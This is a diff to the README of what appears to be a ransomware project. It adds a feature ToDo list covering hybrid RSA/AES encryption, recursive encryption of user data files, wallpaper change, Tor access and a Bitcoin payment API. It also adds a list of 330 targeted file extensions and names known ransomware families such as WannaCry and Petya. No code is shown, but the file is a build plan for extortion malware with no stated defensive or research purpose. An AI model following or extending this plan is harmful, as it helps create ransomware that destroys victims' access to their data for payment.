@@ -1,4 +1,23 @@
+## ToDo
 
+- add logging functionality (done)
+- create class for argument parser (done)
+- create classes for rsa, aes encryption -> Use hybrid encryption (done)
+- iterate through directory structure recursively and load all files (done)
+- add exception handling (done)
+- add unit tests for all classes (in progress)
+- add data structure for holding file extension, mainly user data files (in progress)
+- after encryption check internet connection
+- change project to support multiple os (linux, windows, macos)
+- add a http server with sockets
+- change wallpaper or create gui/local webserver on localhost
+- add classes to access the tor network
+- integrate a bitcoin api
+
+
+## File Extensions
+
+<pre><code>
 ## 0-9
 .3ds .3g2 .3gp .3mf .7z .602 .3dm .3ds                                                                                                  # 8
 
@@ -84,5 +103,17 @@
 ## Z
 .zip .z .z64                                                                                                                            # 3
 
+</code></pre>
 
-= 330
+**330** supported file extensions
+
+## Ransomware Types
+
+- CradleCore (Cradle Ransomware)
+- WannaCry
+- NextCry
+- Petya
+- CryptoLocker
+- TeslaCrypt
+- hidden tear
+- eda2
